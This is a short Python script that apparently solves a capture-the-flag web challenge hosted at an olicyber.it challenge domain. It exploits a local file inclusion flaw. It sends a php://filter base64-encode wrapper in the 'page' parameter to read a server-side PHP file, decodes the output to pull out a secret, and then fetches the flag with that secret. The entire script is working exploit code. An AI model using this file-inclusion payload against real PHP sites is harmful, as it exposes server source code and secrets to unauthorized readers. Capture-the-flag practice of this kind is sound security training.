#!/usr/bin/env python3

from base64 import b64decode
from bs4 import BeautifulSoup
import requests, re

site = "http://splashbox.challs.olicyber.it/"
payload = "php://filter/convert.base64-encode/resource=/var/www/html/flag" # boh sembrava bello

r = requests.get(site + "?page=" + payload)
zuppetta = BeautifulSoup(r.text, "html.parser")
for i in zuppetta.find_all("div", "starter-template"):
    flag = str(i).replace('<div class="starter-template">', "").replace("</div>","").replace(" ", "").replace("\n", "")
    flag = b64decode(flag).decode().split()
    for i in range(len(flag)):
        if flag[i-1] == "===":
            secret = flag[i].replace('"', "").replace(")", "").replace("{", "")

r = requests.get(site + "?page=flag&secret=" + secret)
zuppetta = BeautifulSoup(r.text, "html.parser")

for i in zuppetta.find_all("h2"):
    if "flag" in str(i):
        print(str(i).replace("<h2>", "").replace("</h2>", ""), end="")
